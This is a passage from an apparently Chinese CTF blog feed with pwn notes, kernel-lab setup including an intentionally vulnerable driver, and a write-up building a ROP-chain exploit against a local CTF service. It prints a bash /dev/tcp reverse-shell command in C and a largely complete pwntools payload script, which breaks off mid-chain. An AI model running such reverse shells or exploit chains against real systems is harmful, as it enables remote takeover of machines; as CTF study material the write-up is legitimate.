<p>而且程序中好像还用了这个库 <a href="https://zh.wikipedia.org/wiki/GNU%E5%A4%9A%E9%87%8D%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97%E5%BA%93" target="_blank" rel="external">https://zh.wikipedia.org/wiki/GNU%E5%A4%9A%E9%87%8D%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97%E5%BA%93</a></p>
<p>等WP + 1</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><p>栈溢出, 覆盖随机数种子为0, 然后自己生成50个结果就OK</p>
<h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><p>覆盖返回地址到system, 加个参数’sh’<br>没有怎么调, 大概show了一下数字, 看到像是返回地址, 就覆盖试了一下, getshell<br>唯一的坑点在于不能直接用他的hack函数, 因为他环境里没有<code>bash</code>…</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ropemporium]]></title>
      <url>/2018/07/12/ropemporium/</url>
      <content type="html"><![CDATA[<p>参考wp: <a href="http://bestwing.me/2017/10/19/ropemporium-all-writeup/" target="_blank" rel="external">http://bestwing.me/2017/10/19/ropemporium-all-writeup/</a></p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[kernel 环境搭建]]></title>
      <url>/2018/07/12/kernel-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<p>这个make bzImage用了我2G硬盘…<br>搞得我已经不敢随便make了</p>
<p>其实在做MIT vx6的那实验的时候就搭过类似的环境了…</p>
<p>这里基本是按照传说的v爷爷的blog做的<br><a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" target="_blank" rel="external">https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a></p>
<p>就最后的脚本路径稍微改了一下</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
qemu-system-x86_64 \
-m 64M \
-kernel arch/x86_64/boot/bzImage \
-initrd <span class="token punctuation">..</span>/busybox-1.28.4/rootfs.img \
-append <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr"</span> \
-netdev user,id<span class="token operator">=</span>t0, -device e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 \
-nographic \
-monitor /dev/null \
-smp cores<span class="token operator">=</span>2,threads<span class="token operator">=</span>1 \
-enable-kvm \
-cpu kvm64,+smep \
<span class="token comment" spellcheck="true"># -gdb tcp::1234 \</span>
<span class="token comment" spellcheck="true"># -S</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我为什么编译了那么大的东西….QAQ</p>
<p>最后看到一句…可以直接下载kernel</p>
<pre class="line-numbers language-bash"><code class="language-bash">apt download linux-image-4.15.0-22-generic
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所以….编译内核的意义在哪…<br>是可以对源码定制, 然后重新生成内核吗</p>
<p>我遇到了新的问题…怎么关机</p>
<p>好吧, 关不了机…只能直接<code>Ctrl+c</code></p>
<h2 id="2-Demo"><a href="#2-Demo" class="headerlink" title="2 Demo"></a>2 Demo</h2><p>由于大家在做这demo的时候是用的<code>2.x</code>内核…而我照着大佬搭了一个<code>4.15</code>…(因为没有磁盘空间了,,,就不继续make了)<br>而这其中发生了…一个变迁就是<code>create_proc_entry</code>函数不能用了…就好像你用PHP7跑了SQLi-LAB…发现旧的数据库连接函数都废弃了的时候, 哈哈哈, 这里倒是没那么严重…换了新的函数, 稍作了修改</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// vim null_dereference.c </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/proc_fs.h></span></span>
<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>my_funptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">static</span> ssize_t <span class="token function">bug1_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> file <span class="token operator">*</span>file<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span>size_t len<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>f_pos<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">my_funptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> len<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">struct</span> file_operations proc_fops<span class="token operator">=</span>
<span class="token punctuation">{</span>
    <span class="token punctuation">.</span>write<span class="token operator">=</span>bug1_write
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">null_dereference_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT <span class="token string">"null_dereference driver init!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">proc_create</span><span class="token punctuation">(</span><span class="token string">"bug1"</span><span class="token punctuation">,</span><span class="token number">0666</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>proc_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">null_dereference_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT <span class="token string">"null_dereference driver exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">module_init</span><span class="token punctuation">(</span>null_dereference_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">module_exit</span><span class="token punctuation">(</span>null_dereference_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>另一个栈溢出的demo也是照着改, 而且栈溢出的demo需要关闭ALSR, 然后重新编译内核我就没做了</p>
<h2 id="推荐的资料"><a href="#推荐的资料" class="headerlink" title="推荐的资料"></a>推荐的资料</h2><p>Linux device driver (LDD)<br>linux kernel development (LKD)</p>
<p>Keegan McAllister的<code>Writing kernel exploits</code>…一份ppt, 就大家在传的两个demo</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[suctf2018 pwn]]></title>
      <url>/2018/07/11/suctf2018-pwn/</url>
      <content type="html"><![CDATA[<p>等整理完挖的坑<br>pwnable.tw 1~10<br>HITCON training<br>QWB</p>
<p>就去跟着CTF-All-in-One, 做一下</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[区块链相关的CTF题目 | ddctf & *ctf]]></title>
      <url>/2018/07/10/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9B%B8%E5%85%B3%E7%9A%84CTF%E9%A2%98%E7%9B%AE-ddctf-ctf/</url>
      <content type="html"><![CDATA[<p>DDCTF颁奖的时候才知道这俩题都是同一个大佬出的…</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[google CTF]]></title>
      <url>/2018/07/09/google-CTF/</url>
      <content type="html"><![CDATA[<p>google CTF的环境好像还没关, 可以先学习一波, 然后再继续复现之前的题目, 哈哈哈</p>
<h3 id="catchat"><a href="#catchat" class="headerlink" title="catchat"></a>catchat</h3><p>一道xss, 通过CSRF和注入css来实现…<br>有CSRF保护, 但可以站内发起CSRF<br>貌似这种css注入然后一个字符一个字符把flag注出来的题目之前在哪见过…<br>仿佛是34c3的urlstorage我第一次见到这个类似的<br>但好像当时那题有非预期</p>
<p>biu~看这个wp, 我不写了<br><a href="https://github.com/p4-team/ctf/tree/master/2018-06-23-google-ctf/web_catchat" target="_blank" rel="external">https://github.com/p4-team/ctf/tree/master/2018-06-23-google-ctf/web_catchat</a></p>
<p>这个wp里还说道</p>
<pre><code>This is a bit funny, because we&#39;ve seen in writeups of some other teams, that they got this part all wrong, and their solution worked purely by accident.
</code></pre><p>woc…我也没发现…这个<code>server.js</code>的<code>switch</code>没有<code>break</code>…</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>真是打扰了, 111支队做出来的安卓逆向我也不会做</p>
<p>我还是复现之前的题目吧…也就Web能学习一下, 其他的wp都看不懂</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[execve反弹shell]]></title>
      <url>/2018/07/08/execve%E5%8F%8D%E5%BC%B9shell/</url>
      <content type="html"><![CDATA[<p>我们铁三第一道题目baby_rop</p>
<p>开始想…大概是, 一个栈溢出, 静态链接, 所以用ROPGadget的ropchain就OK</p>
<p>回车是坏字符…中间艰辛操作…然后补上来</p>
<p>还遇到了找<code>int 80h</code>的坑…我再也不用<code>--only</code>了</p>
<p>反正最后改好了shellcode…结果, GG, gdb里看到shell起来了, 但弹不回来, 弹不会来啊, mdzz</p>
<p>感觉应该是因为题目是一个Server, fork出来的进程处理用户输入…是不是这个fork的锅</p>
<p>最后想到了execve反弹shell, 开始想到使用nc…但后来查了一下…ubuntu自带的nc不带<code>-e</code>参数</p>
<p>然后想直接bash反弹shell吧…然而…</p>
<p>遇到了一个坑<br>开始我是这样写的</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>arguments<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span>
    <span class="token string">"-i"</span><span class="token punctuation">,</span>
    <span class="token string">">&amp;"</span><span class="token punctuation">,</span>
    <span class="token string">"/dev/tcp/127.0.0.1/7777"</span><span class="token punctuation">,</span>
    <span class="token string">"0>&amp;1"</span><span class="token punctuation">,</span>
    <span class="token constant">NULL</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> arguments<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果…报了一万个错, 改了半天也不行…</p>
<p>最后发现了正确的姿势, 不直接<code>-i</code>, 先用<code>-c</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>arguments<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span>
        <span class="token string">"-c"</span><span class="token punctuation">,</span>
        <span class="token string">"/bin/bash -i >&amp; /dev/tcp/127.0.0.1/7777 0>&amp;1"</span><span class="token punctuation">,</span>
        <span class="token constant">NULL</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> arguments<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样的话, 对着写shellcode</p>
<p>由于对齐的问题, 稍作了一下修改</p>
<pre><code>/bin//sh -cvv /bin//bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1
</code></pre><p>四个四个分开就是…</p>
<pre><code>=&gt; 0x080ed060
 /bin
 //sh

=&gt; 0x080ed069
 -cvv

=&gt; 0x080ed06e
 /bin
 //ba
 sh -
 i &gt;&amp;
 /dev
 /tcp
 /127
 .0.0
 .1/7
 777 
 0&gt;&amp;1

=&gt; 0x080ed104 (开始用了地址 0x080ed100, 没有注意到\x00会GG)
 0x080ed060
 0x080ed060
 0x080ed060
</code></pre><p>存储字符串, 由于execve第一个参数和arg数组第一个元素相同, 就复用了一下…</p>
<p>最后, 填好参数, 填入execve的调用号11, 调用</p>
<pre><code>EAX = 11
EBX = 0x080ed060
ECX = 0x080ed104
EDX = NULL

int 80h
</code></pre><p>相当于</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/bin//sh"</span><span class="token punctuation">,</span> <span class="token string">"-cvv"</span><span class="token punctuation">,</span> <span class="token string">"/bin//bash -i >&amp; /dev/tcp/127.0.0.1/7777 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin//sh"</span><span class="token punctuation">,</span> arg<span class="token punctuation">,</span> NULL<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>为了凑整…我强行把<code>-c</code>变成了<code>-cvv</code>….笑死我了</p>
<p>然后就OK了</p>
<p>记得先nc监听, 然后再跑脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># author: Aryb1n</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">7745</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">''</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'/bin'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'//sh'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08048bdf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span>


pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed069</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 9 </span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'-cvv'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>


pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed06d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 13</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08048bdf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#-----------------------------------------------</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed06e</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'/bin'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed072</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'//ba'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed076</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'sh -'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>


pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed07a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'i >&amp;'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>


pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed07e</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'/dev'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>


pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08070f9c</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ed082</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 14</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bf3b6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
pay <span class="token operator">+=</span> <span class="token string">'/tcp'</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08099e16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; pop ebx; ret</span>
pay <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0xdeedbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>

